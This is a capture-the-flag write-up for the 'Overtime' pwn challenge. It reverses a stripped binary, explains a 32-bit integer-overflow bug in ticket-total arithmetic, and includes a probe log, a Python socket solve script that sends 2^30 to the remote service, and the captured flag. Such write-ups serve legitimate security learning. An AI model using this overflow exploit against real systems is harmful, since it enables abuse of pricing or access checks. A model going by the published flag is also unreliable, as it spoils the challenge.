---
title: "Overtime"
ctf: "Safaricom CTF"
date: 2026-10-06
category: pwn
difficulty: medium
points: 320
flag_format: "safctf{...}"
author: "Strawhats"
---

# Overtime

> **Category:** PWN · **Points:** 320 · **Difficulty:** medium

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

- Desk page: <http://54.72.82.22:8600/> (title "Overtime", theme BASKETBALL)
- Remote service: `nc 54.72.82.22 8730` — banner `Overtime tickets. Quantity?`
- Binary download: <http://54.72.82.22:8600/downloads/receipt>
  - sha256 `725ebd47451b7b57d97869096eae1c519d6723cbcdc0a19b3efb3acbe244ca69`
  - ELF 64-bit LSB executable, x86-64, dynamically linked, **stripped**, build id `9099e0849618872067fbdb4bf455aa0221da1a28`
  - kept out of git (binary extension is gitignored); staged at `/tmp/a1e98/overtime.bin`

## IMPORTANT — two "receipt" binaries

The desk pages on this box share a common template. Port **8600 (Overtime)** and
port **8610 (Neon Cabaret)** both link `/downloads/receipt` but serve **different**
binaries:

| Port | sha256 (prefix) | First line printed | Nature |
| --- | --- | --- | --- |
| 8600 Overtime   | `725ebd47451b7b57` | `Overtime tickets. Quantity?` | integer-overflow logic bug (this chal) |
| 8610 Neon Cabaret | `360bbeffbc198591` | `Neon Cabaret. Guest line:` | format-string → `%n` write of `0x1337` → ret2win |

Both use the same source skeleton and share `BuildID` (build id was set
deterministically by the author), which makes them easy to confuse. Confirmed by
downloading each port several times (stable per port) and by running both locally.
`/tmp` on this box is shared with other agents — always use unique filenames when
downloading, or a parallel agent will clobber your copy (this happened once here).

## Protections (Overtime binary)

```
RELRO: Partial    Stack: No canary found    NX: enabled    PIE: No PIE (0x400000)
```
No exploit of memory corruption is actually needed — this one is a pure logic /
integer-overflow bug.

## Reverse engineering (stripped `main` @ 0x4011db)

```
setbuf(stdout, NULL)
puts("Overtime tickets. Quantity?")     ; 0x402013
scanf("%u", &qty)                       ; 0x40202f "%u"; 0x402030="Unavailable"
if (scanf != 1) return 1;

edx = qty
eax = qty
eax <<= 2          ; qty * 4
eax += edx         ; qty * 5
eax <<= 3          ; qty * 40
total = eax        ; 32-bit, wraps mod 2**32

if (qty <= 0x63) goto unavailable;              ; unsigned compare, qty must be > 99
if (total > 0x50) goto unavailable;             ; total must be <= 80
win();                                          ; 0x401176
unavailable: puts("Unavailable"); return 0;
```

`win()` (0x401176): `fopen("/run/receipt","r")`, `fgets(buf,0xa0,fp)`,
`puts(buf)`, `fclose(fp)` — i.e. it prints the flag file.

## The bug

The quantity is read as an **unsigned** int (`%u`) and the check requires it to be
**greater than 99**, while the 40x multiplication is done in a **32-bit register
that silently wraps**. So any quantity that is large but whose product is a
multiple of 2**32 satisfies both conditions:

```
qty = 2**30 = 1073741824      2**30 * 40 = 5 * 2**32 == 0 (mod 2**32)
    qty (unsigned) > 99   ✓
    total (unsigned) = 0 <= 80  ✓   -> win path -> flag printed
```

`qty = 2**29 = 536870912` also works. Regression values verified locally first:
`0`, `-1`, `100` → `Unavailable`; `1073741824`, `536870912` → win (no output
locally because `/run/receipt` does not exist on this box).

## Probe log against 8730

```
banner            -> "Overtime tickets. Quantity?\n"
-1 / 0 / 1 / 1e9  -> "Unavailable\n"   (check fails)
"abc" / ""        -> no output (scanf returns 0 -> early return)
1073741824        -> "safctf{cd00df957d06e810a0cd860918f03bb7}\n\n"
536870912         -> "safctf{cd00df957d06e810a0cd860918f03bb7}\n\n"
```

## Reproduce

```
python3 chal/pwn/overtime/solve.py
# -> safctf{cd00df957d06e810a0cd860918f03bb7}
```

## Attempts / dead ends

- Initially analyzed the wrong binary: `/tmp/receipt.bin` got overwritten by a
  parallel agent using the shared `/tmp`, so the first disassembly was actually
  the Neon Cabaret binary. Fixed by re-downloading per-port and hashing.
- Probed quantity overflow in the correct direction (large positive, not negative)
  after reversing the `cmp/shl` sequence.

## Solve script

`pwn/overtime/solve.py`:

```python
#!/usr/bin/env python3
"""Overtime (Safaricom CTF, PWN) — win by integer overflow in the ticket math.

The remote (54.72.82.22:8730) runs the "Overtime" binary. It asks for a
quantity, reads it with scanf("%u"), computes total = quantity * 40 in a
32-bit register (shl/add/shl sequence), and only calls the flag-reading
routine when:

    quantity (unsigned)  >  99          (qty > 0x63)
    total    (unsigned)  <= 80          (32-bit product, mod 2**32)

Because the multiply wraps at 32 bits, a large quantity whose product is a
multiple of 2**32 collapses the total to 0 while the quantity stays > 99.

  quantity = 2**30 = 1073741824  ->  2**30 * 40 = 5 * 2**32 == 0 (mod 2**32)

That satisfies both checks, so the win path runs and prints /run/receipt
(the flag).

Usage:  python3 solve.py            (defaults to 54.72.82.22:8730)
"""
import socket
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "54.72.82.22"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8730

# 2**30 * 40 == 5 * 2**32 == 0 (mod 2**32); 2**30 > 99.
# 2**29 works too (0x20000000).  Any qty with (qty*40) % 2**32 <= 80 and
# qty > 99 does it.
QUANTITY = 1 << 30


def recv_until(sock, marker=b"\n", timeout=6.0):
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    return data


def main():
    with socket.create_connection((HOST, PORT), timeout=15) as s:
        banner = recv_until(s, b"\n")
        sys.stderr.write(banner.decode(errors="replace"))

        s.sendall(b"%d\n" % QUANTITY)

        out = b""
        s.settimeout(6.0)
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                out += chunk
        except socket.timeout:
            pass

    text = out.decode(errors="replace")
    sys.stderr.write(text)

    for line in text.splitlines():
        line = line.strip()
        if line.startswith("safctf{"):
            print(line)
            return 0

    print("NO FLAG FOUND", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
```

## Tools

**Used in this solve:**

- Python `socket` (raw TCP)
- Python 3 (solver)

**Other tools that fit this category:**

- pwntools (exploit dev)
- GDB + pwndbg/GEF
- Ghidra / IDA (static)
- radare2 / rizin
- ROPgadget / ropper
- one_gadget
- checksec, patchelf

## Flag

```
safctf{cd00df957d06e810a0cd860918f03bb7}
```
